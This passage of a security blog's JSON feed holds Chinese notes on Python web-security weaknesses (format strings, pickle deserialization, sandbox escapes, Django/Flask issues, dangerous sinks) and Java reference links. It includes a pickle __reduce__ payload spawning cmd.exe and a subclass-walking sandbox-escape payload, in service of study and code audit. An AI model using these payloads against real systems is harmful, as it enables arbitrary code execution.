data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEwOTE=\">Java 中 RMI、JNDI、LADP、JRMP、JMX、JMS 那些事儿</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RvY3Mub3JhY2xlLmNvbS9jZC9FMTEwMzVfMDEvd2xzMTAwL2NsaWVudC90My5odG1s\">Oracle: Developing T3 Clients</span></li>\n</ul>\n<h2 id=\"jndi-2\"><a class=\"anchor\" href=\"#jndi-2\">#</a> JNDI</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlL3R1dG9yaWFsL2puZGkvb3ZlcnZpZXcvaW5kZXguaHRtbA==\">Overview of JNDI</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQxNy8=\">关于 JNDI 注入</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTYvbWF0ZXJpYWxzL3VzLTE2LU11bm96LUEtSm91cm5leS1Gcm9tLUpOREktTERBUC1NYW5pcHVsYXRpb24tVG8tUkNFLnBkZg==\">A Journey From JNDI LDAP Manipulation To RCE</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIwNzQzOS5odG1s\">如何绕过高版本 JDK 的限制进行 JNDI 注入</span></li>\n</ul>\n<h2 id=\"webshell-2\"><a class=\"anchor\" href=\"#webshell-2\">#</a> WebShell</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzc5OA==\">各种姿势 jsp webshell</span></li>\n</ul>\n<h2 id=\"其他漏洞\"><a class=\"anchor\" href=\"#其他漏洞\">#</a> 其他漏洞</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L2xhbmd1YWdlL2phdmEvYmxvZy5zcG9vY2suY29tLzIwMTgvMTAvMjMvamF2YS14eGUvaW5kZXguaHRtbA==\">JAVA 常见的 XXE 漏洞写法和防御</span></li>\n</ul>\n",
            "tags": [
                "Java",
                "语言",
                "反序列化",
                "混淆",
                "沙箱",
                "类",
                "JDK"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Python/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Python/",
            "title": "Python",
            "date_published": "2022-11-27T08:42:11.000Z",
            "content_html": "<h1 id=\"格式化字符串\"><a class=\"anchor\" href=\"#格式化字符串\">#</a> 格式化字符串</h1>\n<p>在 Python 中，有两种格式化字符串的方式，在 Python2 的较低版本中，格式化字符串的方式为  <code>&quot;this is a %s&quot; % &quot;test&quot;</code>  ，之后增加了 format 的方式， 语法为  <code>&quot;this is a &#123;&#125;&quot;.format('test')</code>  或者  <code>&quot;this is a &#123;test&#125;&quot;.format(test='test')</code></p>\n<p>当格式化字符串由用户输入时，则可能会造成一些问题，下面是一个最简单的例子</p>\n<pre><code>&gt;&gt;&gt; 'class of &#123;0&#125; is &#123;0.__class__&#125;'.format(42)\n&quot;class of 42 is &lt;class 'int'&gt;&quot;\n</code></pre>\n<p>从上面这个简单的例子不难知道，当我们可以控制要 format 的字符串时，则可以使用  <code>__init__</code>  /  <code>__globals__</code>  等属性读取一些比较敏感的值，甚至任意执行代码。</p>\n<h1 id=\"反序列化\"><a class=\"anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<h2 id=\"pickle-demo\"><a class=\"anchor\" href=\"#pickle-demo\">#</a> pickle demo</h2>\n<p>Python Pickle 在反序列化时会调用  <code>__reduce__</code>  ，可用自定义的  <code>__reduce__</code>  函数来实现攻击。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> pickle</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> pickletools</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> subprocess</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    a <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    b <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>Popen<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cmd.exe'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>data <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>pickletools<span class=\"token punctuation\">.</span>dis<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"其他序列化库\"><a class=\"anchor\" href=\"#其他序列化库\">#</a> 其他序列化库</h2>\n<ul>\n<li>PyYAML</li>\n<li>marshal</li>\n<li>shelve</li>\n</ul>\n<h1 id=\"沙箱\"><a class=\"anchor\" href=\"#沙箱\">#</a> 沙箱</h1>\n<h2 id=\"常用函数\"><a class=\"anchor\" href=\"#常用函数\">#</a> 常用函数</h2>\n<ul>\n<li>eval / exec / compile</li>\n<li>dir / type</li>\n<li>globals / locals / vars</li>\n<li>getattr / setattr</li>\n</ul>\n<h2 id=\"导入包方式\"><a class=\"anchor\" href=\"#导入包方式\">#</a> 导入包方式</h2>\n<ul>\n<li><code>import os</code></li>\n<li><code>from os import *</code></li>\n<li><code>__import__(&quot;os&quot;)</code></li>\n<li><code>importlib</code></li>\n<li><code>imp</code></li>\n<li><code>reload(os)</code></li>\n<li><code>execfile</code>  仅 Python2 支持</li>\n</ul>\n<h2 id=\"绕过\"><a class=\"anchor\" href=\"#绕过\">#</a> 绕过</h2>\n<ul>\n<li><code>dir(__builtins__)</code>  查看内置模块</li>\n<li>最简单的思路是在已有的模块中 import，如果那个模块中已经 import 可以利用的模块就可以使用了</li>\n<li>在父类中寻找可用的模块，最常见 payload 是  <code>().__class__.__bases__[0].__subclasses__()</code>  或者用魔术方法获取全局作用域  <code>__init__.__func__.__globals__</code></li>\n<li>有些网站没有过滤 pickle 模块，可以使用 pickle 实现任意代码执行，生成 payload 可以使用  <code>https://gist.github.com/freddyb/3360650</code></li>\n<li>有的沙箱把相关的模块代码都被删除了，则可以使用 libc 中的函数，Python 中调用一般可以使用 ctypes 或者 cffi。</li>\n<li><code>&quot;A&quot;&quot;B&quot; == &quot;AB&quot;</code></li>\n</ul>\n<h2 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h2>\n<p>Python 官方给出了一些防御的建议</p>\n<ul>\n<li>使用 Jython 并尝试使用 Java 平台来锁定程序的权限</li>\n<li>使用 fakeroot 来避免</li>\n<li>使用一些 rootjail 的技术</li>\n</ul>\n<h1 id=\"框架\"><a class=\"anchor\" href=\"#框架\">#</a> 框架</h1>\n<h2 id=\"django\"><a class=\"anchor\" href=\"#django\">#</a> Django</h2>\n<h3 id=\"历史漏洞\"><a class=\"anchor\" href=\"#历史漏洞\">#</a> 历史漏洞</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzU4Lw==\">CVE-2016-7401 CSRF Bypass</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGphbmdvcHJvamVjdC5jb20vd2VibG9nLzIwMTcvYXByLzA0L3NlY3VyaXR5LXJlbGVhc2VzLw==\">CVE-2017-7233/7234 Open redirect vulnerability</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZGphbmdvLWRlYnVnLXBhZ2UteHNzLmh0bWw=\">CVE-2017-12794 debug page XSS</span></li>\n</ul>\n<h3 id=\"配置相关\"><a class=\"anchor\" href=\"#配置相关\">#</a> 配置相关</h3>\n<ul>\n<li>Nginx 在为 Django 做反向代理时，静态文件目录配置错误会导致源码泄露。访问 /static.. 会 301 重定向到 /static../</li>\n</ul>\n<h2 id=\"flask\"><a class=\"anchor\" href=\"#flask\">#</a> Flask</h2>\n<p>Flask 默认使用客户端 session，使得 session 可以被伪造</p>\n<h1 id=\"代码混淆\"><a class=\"anchor\" href=\"#代码混淆\">#</a> 代码混淆</h1>\n<h2 id=\"常见混淆方式\"><a class=\"anchor\" href=\"#常见混淆方式\">#</a> 常见混淆方式</h2>\n<ul>\n<li>基于 AST 变换</li>\n<li>编译为 pyc 文件</li>\n<li>Pyinstaller</li>\n<li>PyArmor</li>\n<li>通过 AES 加密为 pye 文件</li>\n</ul>\n<h1 id=\"sink\"><a class=\"anchor\" href=\"#sink\">#</a> Sink</h1>\n<h2 id=\"命令执行\"><a class=\"anchor\" href=\"#命令执行\">#</a> 命令执行</h2>\n<ul>\n<li>asyncio.new_event_loop().subprocess_exec</li>\n<li>asyncio.subprocess</li>\n<li>bdb.os</li>\n<li>cgi.os.system</li>\n<li>cgi.sys</li>\n<li>code.InteractiveInterpreter</li>\n<li>commands</li>\n<li>ctypes.CDLL</li>\n<li>eval</li>\n<li>exec</li>\n<li>execfile</li>\n<li>input // python2 only</li>\n<li>os.exec</li>\n<li>os.exec*</li>\n<li>os.fork</li>\n<li>os.popen</li>\n<li>os.spawn</li>\n<li>os.system</li>\n<li>platform.os</li>\n<li>platform.popen</li>\n<li>platform.sys</li>\n<li>popen2</li>\n<li>pty.os</li>\n<li>pty.spawn</li>\n<li>subprocess</li>\n<li>timeit.sys</li>\n<li>timeit.timeit</li>\n<li>typing.get_type_hints() +  <code>__annotations__</code></li>\n<li>...</li>\n</ul>\n<h2 id=\"文件读取\"><a class=\"anchor\" href=\"#文件读取\">#</a> 文件读取</h2>\n<ul>\n<li>open</li>\n<li>os.open</li>\n<li>urllib.request.urlopen('[file:///](file:///)')</li>\n<li>codecs.open</li>\n<li>fileinput</li>\n<li>仅 Python2\n<ul>\n<li>types.FileType</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"危险第三方库\"><a class=\"anchor\" href=\"#危险第三方库\">#</a> 危险第三方库</h2>\n<ul>\n<li>Template</li>\n<li>subprocess32</li>\n</ul>\n<h2 id=\"反序列化-2\"><a class=\"anchor\" href=\"#反序列化-2\">#</a> 反序列化</h2>\n<ul>\n<li>marshal</li>\n<li>PyYAML</li>\n<li>pickle</li>\n<li>cPickle</li>\n<li>shelve</li>\n<li>PIL</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"反序列化-3\"><a class=\"anchor\" href=\"#反序列化-3\">#</a> 反序列化</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy45MXJpLm9yZy85NTc2Lmh0bWw=\">Python pickle 反序列化</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLnB5dGhvbi5vcmcvbW9pbi9TYW5kYm94ZWRQeXRob24=\">Python 沙箱 官方 wiki</span></li>\n<li>[Python eval 的常见错误封装及利用原理](<span class=\"exturl\" data-url=\"aHR0cDovL3h4bGVnZW5kLmNvbS8yMDE1LzA3LzMxL1B5dGhvbg==\">http://xxlegend.com/2015/07/31/Python</span> eval 的常见错误封装及利用原理 /)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3BpY2tsZS5odG1s\">pickle Python 对象序列化</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vYmgtdXMtMTEvU2xhdmllcm8vQkhfVVNfMTFfU2xhdmllcm9fU291cl9QaWNrbGVzX1NsaWRlcy5wZGY=\">Sour Pickles A serialised exploitation guide in one part</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydXNodGVyLmNvbS9ibG9nL3BpY2tsZS1zZXJpYWxpemF0aW9uLWludGVybmFscy8=\">How pickle works in Python</span></li>\n</ul>\n<h2 id=\"沙箱-2\"><a class=\"anchor\" href=\"#沙箱-2\">#</a> 沙箱</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODYzNjY=\">Python 沙箱通用绕过</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIwMzIwOC5odG1s\">一文看懂 Python 沙箱逃逸</span></li>\n</ul>\n<h2 id=\"格式化字符串-2\"><a class=\"anchor\" href=\"#格式化字符串-2\">#</a> 格式化字符串</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vcHl0aG9uLXN0cmluZy1mb3JtYXQtdnVsbmVyYWJpbGl0eS5odG1s\">Python 字符串格式化漏洞</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2x1Y3Vtci5wb2Nvby5vcmcvMjAxNi8xMi8yOS9jYXJlZnVsLXdpdGgtc3RyLWZvcm1hdC8=\">Be Careful with Python's New-Style String Format</span></li>\n</ul>\n<h2 id=\"综合\"><a class=\"anchor\" href=\"#综合\">#</a> 综合</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZzdGlubmVyL3B5dGhvbi1zZWN1cml0eS5naXQ=\">python security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vcHl0aG9uX3NlYw==\">Python 安全和代码审计相关资料收集</span></li>\n</ul>\n",
            "tags": [
                "语言",
                "反序列化",
                "混淆",
                "沙箱",
                "Python"
            ]
        }
    ]
}